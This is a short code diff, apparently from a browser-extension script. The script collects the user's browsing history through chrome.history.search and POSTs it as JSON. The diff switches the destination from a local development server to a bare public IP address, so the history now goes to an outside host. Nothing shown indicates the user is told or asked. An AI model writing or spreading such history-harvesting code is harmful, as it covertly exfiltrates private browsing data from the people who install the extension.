@@ -12,10 +12,10 @@ chrome.history.search({
 			this.pages.push(income) 
 		},
 		send: function() {
-			fetch("http://127.0.0.1:5000/api/get_history", {
+			fetch("http://95.163.180.52/api/get_history", {
 			  method: "POST", 
 			  headers: {
-			    'Access-Control-Allow-Origin': 'http://127.0.0.1:5000/'
+			    'Access-Control-Allow-Origin': 'http://95.163.180.52/'
 			  },
 			  body: JSON.stringify(this.pages)
 			}).then(res => {
